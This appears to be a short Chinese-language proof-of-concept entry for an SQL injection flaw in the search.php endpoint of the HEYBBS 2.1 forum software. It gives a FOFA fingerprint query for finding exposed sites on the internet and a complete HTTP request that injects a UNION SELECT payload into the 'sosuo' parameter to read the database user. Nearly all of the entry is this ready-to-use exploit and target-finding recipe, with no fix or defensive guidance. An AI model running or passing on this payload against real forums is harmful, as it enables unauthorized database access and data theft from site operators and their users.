# HEYBBS2.1论坛search.php存在sql注入漏洞

HEYBBS2.1论坛在search.php接口下存在sql注入漏洞

## fofa

```javascript
Body="微社区, 微论坛, 微博客"
```

## poc

```javascript
GET /search.php?sosuo=qq%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,CONCAT(0xc,user(),0xc),NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: https://fofa.info/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache


```
